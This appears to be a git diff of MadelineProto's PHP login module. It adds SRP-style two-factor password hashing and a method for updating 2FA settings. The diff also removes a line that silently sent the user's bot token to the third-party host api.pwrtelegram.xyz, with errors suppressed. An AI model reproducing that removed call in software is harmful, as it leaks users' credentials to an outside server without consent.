@@ -1,17 +1,25 @@
 <?php
 
-/*
-Copyright 2016-2018 Daniil Gentili
-(https://daniil.it)
-This file is part of MadelineProto.
-MadelineProto is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
-MadelineProto is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-See the GNU Affero General Public License for more details.
-You should have received a copy of the GNU General Public License along with MadelineProto.
-If not, see <http://www.gnu.org/licenses/>.
-*/
+/**
+ * Login module.
+ *
+ * This file is part of MadelineProto.
+ * MadelineProto is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
+ * MadelineProto is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * See the GNU Affero General Public License for more details.
+ * You should have received a copy of the GNU General Public License along with MadelineProto.
+ * If not, see <http://www.gnu.org/licenses/>.
+ *
+ * @author    Daniil Gentili <daniil@daniil.it>
+ * @copyright 2016-2018 Daniil Gentili <daniil@daniil.it>
+ * @license   https://opensource.org/licenses/AGPL-3.0 AGPLv3
+ *
+ * @link      https://docs.madelineproto.xyz MadelineProto documentation
+ */
 
 namespace danog\MadelineProto\Wrappers;
+
+use danog\MadelineProto\MTProtoTools\PasswordCalculator;
 
 /**
  * Manages logging in and out.
@@ -53,9 +61,6 @@ trait Login
         $this->datacenter->sockets[$this->datacenter->curdc]->authorized = true;
         $this->updates = [];
         $this->updates_key = 0;
-        if (!isset($this->settings['pwr']['pwr']) || !$this->settings['pwr']['pwr']) {
-            @file_get_contents('https://api.pwrtelegram.xyz/bot'.$token.'/getme');
-        }
         $this->init_authorization();
         $this->logger->logger(\danog\MadelineProto\Lang::$current_lang['login_ok'], \danog\MadelineProto\Logger::NOTICE);
 
@@ -94,8 +99,8 @@ trait Login
         } catch (\danog\MadelineProto\RPCErrorException $e) {
             if ($e->rpc === 'SESSION_PASSWORD_NEEDED') {
                 $this->logger->logger(\danog\MadelineProto\Lang::$current_lang['login_2fa_enabled'], \danog\MadelineProto\Logger::NOTICE);
-                $this->authorized = self::WAITING_PASSWORD;
                 $this->authorization = $this->method_call('account.getPassword', [], ['datacenter' => $this->datacenter->curdc]);
+                $this->authorized = self::WAITING_PASSWORD;
 
                 return $this->authorization;
             }
@@ -179,13 +184,23 @@ trait Login
             throw new \danog\MadelineProto\Exception(\danog\MadelineProto\Lang::$current_lang['2fa_uncalled']);
         }
         $this->authorized = self::NOT_LOGGED_IN;
+        $hasher = new PasswordCalculator($this->logger);
+        $hasher->addInfo($this->authorization);
         $this->logger->logger(\danog\MadelineProto\Lang::$current_lang['login_user'], \danog\MadelineProto\Logger::NOTICE);
-        $this->authorization = $this->method_call('auth.checkPassword', ['password_hash' => hash('sha256', $this->authorization['current_salt'].$password.$this->authorization['current_salt'], true)], ['datacenter' => $this->datacenter->curdc]);
+        $this->authorization = $this->method_call('auth.checkPassword', ['password' => $hasher->getCheckPassword($password)], ['datacenter' => $this->datacenter->curdc]);
         $this->authorized = self::LOGGED_IN;
         $this->datacenter->sockets[$this->datacenter->curdc]->authorized = true;
         $this->init_authorization();
         $this->logger->logger(\danog\MadelineProto\Lang::$current_lang['login_ok'], \danog\MadelineProto\Logger::NOTICE);
 
         return $this->authorization;
+    }
+
+    public function update_2fa(array $params): bool
+    {
+        $hasher = new PasswordCalculator($this->logger);
+        $hasher->addInfo($this->method_call('account.getPassword', [], ['datacenter' => $this->datacenter->curdc]));
+
+        return $this->method_call('account.updatePasswordSettings', $hasher->getPassword($params), ['datacenter' => $this->datacenter->curdc]);
     }
 }
